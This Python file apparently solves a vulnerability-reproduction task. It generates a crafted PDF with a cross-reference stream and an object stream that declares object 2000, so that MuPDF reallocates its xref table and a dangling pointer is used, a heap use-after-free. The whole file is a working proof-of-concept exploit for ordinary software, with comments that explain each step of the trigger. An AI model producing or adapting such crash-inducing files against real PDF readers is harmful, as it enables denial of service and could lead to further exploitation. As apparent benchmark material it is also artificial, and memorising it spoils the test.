import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PDF that triggers a Heap Use-After-Free in MuPDF.
        # Strategy:
        # 1. Create a PDF with a Cross-Reference Stream (PDF 1.5).
        # 2. Define an Object Stream (Obj 4) that contains object 5.
        # 3. Define the XRef table with a small initial size (Size 7), containing entries 0-6.
        # 4. In the Object Stream (Obj 4), define object 5 (at offset 0) and object 2000 (at offset 4).
        # 5. Accessing object 5 (via Page annotations) triggers loading of Obj 4.
        # 6. Loading Obj 4 parses its content pairs. When it encounters object 2000, it checks the xref table.
        # 7. Since 2000 >= 7, the xref table is reallocated/resized.
        # 8. The original xref entry pointer for object 5 (held during the recursive call) becomes a dangling pointer.
        # 9. Use of this pointer causes the crash.

        # 1. Header
        header = b"%PDF-1.5\n"
        
        # 2. Objects
        
        # Object 1: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Object 2: Pages
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page
        # References Object 5 via Annots to force loading.
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Annots [5 0 R] >>\nendobj\n"
        
        # Object 4: Object Stream
        # Contains definitions for Object 5 and Object 2000.
        # Header format: "obj_num1 offset1 obj_num2 offset2 ..."
        # "5 0 2000 4" -> Obj 5 at offset 0, Obj 2000 at offset 4 relative to First.
        # Padded to 20 bytes (value of First).
        pair_str = b"5 0 2000 4"
        padding = b" " * (20 - len(pair_str))
        stm_head = pair_str + padding
        
        # Content of objects inside stream
        c5 = b"<<>>"      # Object 5 (at relative offset 0)
        c2000 = b"<<>>"   # Object 2000 (at relative offset 4)
        
        stm_body = stm_head + c5 + c2000
        
        obj4_dict = f"<< /Type /ObjStm /N 2 /First 20 /Length {len(stm_body)} >>".encode('ascii')
        obj4 = b"4 0 obj\n" + obj4_dict + b"\nstream\n" + stm_body + b"\nendstream\nendobj\n"
        
        # Assemble body to calculate offsets
        body = header + obj1 + obj2 + obj3 + obj4
        
        off1 = body.find(b"1 0 obj")
        off2 = body.find(b"2 0 obj")
        off3 = body.find(b"3 0 obj")
        off4 = body.find(b"4 0 obj")
        off6 = len(body)
        
        # 3. XRef Stream (Object 6)
        # Size 7 (Entries 0-6).
        # W [1, 2, 1] -> Type (1 byte), Offset/Operand (2 bytes), Gen/Index (1 byte).
        
        def entry(type_, f2, f3):
            # Big-endian packing
            return struct.pack('>BHB', type_, f2, f3)
            
        xref = b""
        xref += entry(0, 0, 255)      # 0: Free
        xref += entry(1, off1, 0)     # 1: Uncompressed, offset off1
        xref += entry(1, off2, 0)     # 2: Uncompressed, offset off2
        xref += entry(1, off3, 0)     # 3: Uncompressed, offset off3
        xref += entry(1, off4, 0)     # 4: Uncompressed, offset off4
        xref += entry(2, 4, 0)        # 5: Compressed in stream 4, index 0
        xref += entry(1, off6, 0)     # 6: Uncompressed, offset off6 (self)
        
        obj6_dict = f"<< /Type /XRef /Size 7 /W [1 2 1] /Root 1 0 R /Length {len(xref)} >>".encode('ascii')
        obj6 = b"6 0 obj\n" + obj6_dict + b"\nstream\n" + xref + b"\nendstream\nendobj\n"
        
        # 4. Footer
        footer = b"startxref\n" + str(off6).encode('ascii') + b"\n%%EOF\n"
        
        return body + obj6 + footer